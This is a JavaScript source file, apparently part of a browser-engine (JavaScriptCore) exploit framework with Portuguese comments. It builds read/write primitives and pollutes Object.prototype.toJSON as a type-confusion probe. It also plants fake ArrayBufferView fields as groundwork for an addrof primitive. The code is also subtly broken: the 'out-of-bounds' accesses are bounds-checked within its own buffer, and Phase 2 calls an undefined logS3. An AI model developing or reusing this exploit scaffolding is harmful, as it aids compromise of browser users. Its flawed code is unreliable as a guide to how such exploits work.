// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    if (isOOBEnvironmentSetup || options.force_clear_even_if_not_setup) {
        // log(`Limpando ambiente OOB... (Setup anterior: ${isOOBEnvironmentSetup})`, 'info', FNAME_CLEAR);
    }
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    if (isOOBEnvironmentSetup) {
        // log(`Ambiente OOB limpo.`, 'info', FNAME_CLEAR);
    }
    isOOBEnvironmentSetup = false;
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}
export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real) {
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas as variáveis são inválidas/inconsistentes. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }

    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`   Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });

    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`   oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(absolute_offset, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para leitura em ${toHexHelper(absolute_offset)}`, "error", FNAME_READ);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para leitura.");
    }
    const relative_offset = absolute_offset;
    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Leitura OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(relative_offset);
            case 2: return oob_dataview_real.getUint16(relative_offset, true);
            case 4: return oob_dataview_real.getUint32(relative_offset, true);
            case 8: {
                const low = oob_dataview_real.getUint32(relative_offset, true);
                const high = oob_dataview_real.getUint32(relative_offset + 4, true);
                return new AdvancedInt64(low, high);
            }
            default:
                log(`ERRO: Tamanho de leitura inválido: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for read: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_READ);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export function oob_write_absolute(absolute_offset, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para escrita em ${toHexHelper(absolute_offset)}`, "error", FNAME_WRITE);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) {
            isOOBEnvironmentSetup = false;
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para escrita.");
    }
    const relative_offset = absolute_offset;
    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Escrita OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(relative_offset, Number(value)); break;
            case 2: oob_dataview_real.setUint16(relative_offset, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(relative_offset, Number(value), true); break;
            case 8:
                if (!isAdvancedInt64Object(value)) {
                    throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64");
                }
                oob_dataview_real.setUint32(relative_offset, value.low(), true);
                oob_dataview_real.setUint32(relative_offset + 4, value.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for write: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false;
        }
        throw e;
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }
        const next_offset = test_offset + 8;
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

export function isOOBReady() {
    return isOOBEnvironmentSetup &&
           oob_array_buffer_real instanceof ArrayBuffer &&
           oob_dataview_real instanceof DataView &&
           oob_array_buffer_real.byteLength > 0 &&
           oob_dataview_real.buffer === oob_array_buffer_real &&
           oob_dataview_real.buffer.byteLength > 0;
}

// ---- FUNÇÃO DE AUTO-TESTE PARA TYPE CONFUSION E CONTROLE DE MEMÓRIA ----
export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { // Nome alterado para refletir o escopo
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado: Type Confusion e Controle de Memória para Addrof ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details = null; // Para a sonda toJSON da Type Confusion
    let overallSuccess = true;

    try {
        // ---- FASE 1: TESTE DE TYPE CONFUSION ----
        currentLog(`FASE 1: Testando Type Confusion...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true }); // Estado limpo para o teste de type confusion
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }

        const mLengthOffsetInView_TC = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
        if (isNaN(mLengthOffsetInView_TC)) {
            currentLog("ERRO CRÍTICO (TC): JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_TEST);
            return false;
        }
        const corruptionTargetOffset_TC = 0x58 + mLengthOffsetInView_TC; // Alvo para induzir type confusion
        const CRITICAL_OOB_WRITE_VALUE_TC  = 0xFFFFFFFF;
        const VICTIM_AB_SIZE_TC = 64;

        currentLog(`   (TC) Alvo da corrupção OOB: ${toHexHelper(corruptionTargetOffset_TC)} (Base 0x58 + M_LENGTH_OFFSET ${toHexHelper(mLengthOffsetInView_TC)})`, 'info', FNAME_TEST);
        currentLog(`   (TC) PASSO 1: Escrevendo valor CRÍTICO ${toHexHelper(CRITICAL_OOB_WRITE_VALUE_TC)} em oob_array_buffer_real[${toHexHelper(corruptionTargetOffset_TC)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruptionTargetOffset_TC, CRITICAL_OOB_WRITE_VALUE_TC, 4); // Escrita que causa a type confusion
        currentLog(`     (TC) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_tc = new ArrayBuffer(VICTIM_AB_SIZE_TC);
        currentLog(`   (TC) PASSO 2: victim_ab (${VICTIM_AB_SIZE_TC} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_HighlyFidelityProbe_TC = function() {
            local_probe_details = {
                probe_variant: "CoreExploit_HighFidelityProbe_TC",
                this_type_in_toJSON: "N/A_before_call",
                error_in_toJSON: null,
                probe_called: false
            };
            try {
                local_probe_details.probe_called = true;
                local_probe_details.this_type_in_toJSON = Object.prototype.toString.call(this);
            } catch (e) {
                local_probe_details.error_in_toJSON = `${e.name}: ${e.message}`;
            }
            return { minimal_probe_executed_tc: true };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_HighlyFidelityProbe_TC,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`     (TC) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);
        local_probe_details = null;
        let stringifyOutput_TC = null;

        currentLog(`     (TC) Chamando JSON.stringify(victim_ab_tc)...`, "warn", FNAME_TEST);
        try {
            stringifyOutput_TC = JSON.stringify(victim_ab_tc);
            currentLog(`     (TC) JSON.stringify completou. Resultado (retorno da sonda): ${stringifyOutput_TC ? JSON.stringify(stringifyOutput_TC) : 'N/A'}`, "info", FNAME_TEST);
        } catch (e) {
            currentLog(`     (TC) ERRO durante JSON.stringify: ${e.name} - ${e.message}`, "error", FNAME_TEST);
            if (local_probe_details === null) {
                 local_probe_details = { probe_variant: "CoreExploit_HighFidelityProbe_TC", this_type_in_toJSON: `Error during stringify: ${e.name}`, error_in_toJSON: `${e.name}: ${e.message}`, probe_called: false };
            } else if (local_probe_details.error_in_toJSON === null && e) {
                local_probe_details.error_in_toJSON = `Outer stringify error: ${e.name}: ${e.message}`;
            }
        }
        currentLog(`     (TC) Detalhes da sonda (local_probe_details): ${local_probe_details ? JSON.stringify(local_probe_details) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details && local_probe_details.probe_called && local_probe_details.this_type_in_toJSON === "[object Object]") {
            currentLog(`   (TC) SUCESSO: Confusão de tipo detectada! 'this' é [object Object].`, "vuln", FNAME_TEST);
        } else {
            let detailsMsg = local_probe_details ? local_probe_details.this_type_in_toJSON : "sonda não forneceu detalhes";
            if (local_probe_details && local_probe_details.error_in_toJSON) detailsMsg += ` (Erro na sonda: ${local_probe_details.error_in_toJSON})`;
            currentLog(`   (TC) FALHA: Teste de Type Confusion. 'this' na sonda: ${detailsMsg}. Esperado [object Object].`, "error", FNAME_TEST);
            overallSuccess = false; // Marcar falha geral se esta parte falhar
        }

    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`     (TC) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false; // Reset for next phase if any
            originalToJSONDescriptor = null;
        }
    }

    if (!overallSuccess) {
        currentLog(`Teste de Type Confusion falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }

    await PAUSE(200); // Pausa entre as fases

    // ---- FASE 2: TESTE DE CONTROLE DE MEMÓRIA (BASE PARA ADDROF) ----
    currentLog(`FASE 2: Testando Controle de Memória para Addrof...`, 'subtest', FNAME_TEST);
    try {
        // O ambiente OOB já deve estar configurado da fase anterior.
        // Se precisarmos de um estado totalmente limpo para esta fase, deveríamos chamar triggerOOB_primitive({ force_reinit: true });
        // Por ora, vamos assumir que podemos continuar no mesmo oob_array_buffer_real.
        if (!isOOBReady()) {
            // Tentativa de reconfigurar se não estiver pronto, mas isso pode indicar um problema anterior.
            currentLog(`   (MC) Ambiente OOB não estava pronto. Tentando reconfigurar...`, 'warn', FNAME_TEST);
            await triggerOOB_primitive({ force_reinit: true });
            if (!isOOBReady()) {
                 throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
        }

        const OFFSET_M_VECTOR = 0x68; // Endereço absoluto no oob_array_buffer_real para m_vector
        const OFFSET_M_LENGTH = 0x70; // Endereço absoluto no oob_array_buffer_real para m_length
        const OFFSET_M_MODE   = 0x74; // Endereço absoluto no oob_array_buffer_real para m_mode (parte alta de m_length QWORD)

        const PLANT_VAL_M_VECTOR_LOW  = 0xAABBCCDD;
        const PLANT_VAL_M_VECTOR_HIGH = 0x11223344;
        const PLANT_M_VECTOR = new AdvancedInt64(PLANT_VAL_M_VECTOR_LOW, PLANT_VAL_M_VECTOR_HIGH);

        const CORRUPTION_VAL_M_LENGTH = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Para m_length e m_mode

        currentLog(`   (MC) Configurando estrutura hipotética de ArrayBufferView:`, 'info', FNAME_TEST);
        currentLog(`     m_vector (@${toHexHelper(OFFSET_M_VECTOR)}) para ${PLANT_M_VECTOR.toString(true)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_VECTOR, PLANT_M_VECTOR, 8);

        currentLog(`     m_length e m_mode (@${toHexHelper(OFFSET_M_LENGTH)}) para ${CORRUPTION_VAL_M_LENGTH.toString(true)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_LENGTH, CORRUPTION_VAL_M_LENGTH, 8); // Isso define m_length=FFFFFFFF, m_mode=FFFFFFFF

        currentLog(`   (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
        const read_m_vector = oob_read_absolute(OFFSET_M_VECTOR, 8);
        const read_m_length_qword = oob_read_absolute(OFFSET_M_LENGTH, 8);
        const read_m_length = read_m_length_qword.low();
        const read_m_mode = read_m_length_qword.high();

        logS3(`     Lido m_vector (@${toHexHelper(OFFSET_M_VECTOR)}): ${read_m_vector.toString(true)}`, "leak", FNAME_TEST);
        logS3(`     Lido m_length (@${toHexHelper(OFFSET_M_LENGTH)}): ${toHexHelper(read_m_length)}`, "leak", FNAME_TEST);
        logS3(`     Lido m_mode   (@${toHexHelper(OFFSET_M_MODE)}): ${toHexHelper(read_m_mode)}`, "leak", FNAME_TEST);

        let memoryControlSuccess = true;
        if (!read_m_vector.equals(PLANT_M_VECTOR)) {
            currentLog(`   (MC) FALHA: m_vector lido (${read_m_vector.toString(true)}) não corresponde ao plantado (${PLANT_M_VECTOR.toString(true)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_length !== CORRUPTION_VAL_M_LENGTH.low()) { // low() é 0xFFFFFFFF
            currentLog(`   (MC) FALHA: m_length lido (${toHexHelper(read_m_length)}) não corresponde ao esperado (0xFFFFFFFF).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_mode !== CORRUPTION_VAL_M_LENGTH.high()) { // high() é 0xFFFFFFFF
             currentLog(`   (MC) FALHA: m_mode lido (${toHexHelper(read_m_mode)}) não corresponde ao esperado (0xFFFFFFFF).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }

        if (memoryControlSuccess) {
            currentLog(`   (MC) SUCESSO: Controle de m_vector, m_length e m_mode verificado!`, "vuln", FNAME_TEST);
            currentLog(`     Pronto para usar esta estrutura para construir um DataView/TypedArray mágico.`, "info", FNAME_TEST);
        } else {
            currentLog(`   (MC) FALHA: Teste de Controle de Memória.`, "error", FNAME_TEST);
            overallSuccess = false;
        }

    } catch (e) {
        currentLog(`ERRO na FASE 2 (Controle de Memória): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    }

    if (overallSuccess) {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM SUCESSO ---`, 'test', FNAME_TEST);
        return true;
    } else {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }
}
